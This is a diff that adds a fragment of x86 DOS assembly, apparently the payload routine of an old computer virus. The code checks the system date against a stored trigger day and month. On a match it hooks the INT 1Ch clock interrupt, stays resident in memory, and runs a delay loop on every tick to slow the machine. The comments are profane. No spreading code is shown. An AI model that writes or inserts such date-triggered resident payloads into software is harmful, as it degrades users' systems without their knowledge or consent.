@@ -1,0 +1,42 @@
+;---------------------------------
+action:                          ; 
+MOV AH,2AH                       ;        
+INT 21H                          ;get date           
+CMP Dl,byte ptr cs:[action_dia+bp]  ;is equal to my day?                 
+JE  cont                         ;nop! fuck ret          
+cmp byte ptr cs:[action_dia+bp],32  ;
+jne no_day                       ;
+cont:                            ; 
+cmp dh,byte ptr cs:[action_mes+bp]  ;is equal to my month?            
+je set                           ;
+cmp byte ptr cs:[action_mes+bp],13  ;
+jne NO_DAY                       ;nop! fuck ret           
+set:                             ; 
+        
+mov ax,351ch                     ;
+int 21h                          ;store the int 1ch vectors 
+mov word ptr [trampaint+bp],bx      ;in cs:trampaint
+mov word ptr [trampaint+2+bp],es    ;
+mov ax,251ch                     ;put the int 1ch (clock) vector     
+push cs                          ;   
+pop ds                           ;  
+mov dx,offset tardar             ;in offset tardar
+int 21h                          ;  
+mov dx,offset fin                ;
+int 27h                          ;main resident the code
+NO_DAY:                          ;             
+ret                              ;ret for program
+tardar:                          ;int 1c handler
+pushf                            ;
+pusha                            ;
+mov cx,0ffffh                    ;fuck loop for slow speed
+trampa:                          ;
+mov ax,ax                        ;
+loop trampa                      ;
+popa                             ;
+popf                             ;
+JMP dword ptr CS:[trampaint+bp]     ;jmp to original int 1ch
+ret                              ;
+trampaint  dd  ?                 ;
+;--------------------------------;
+
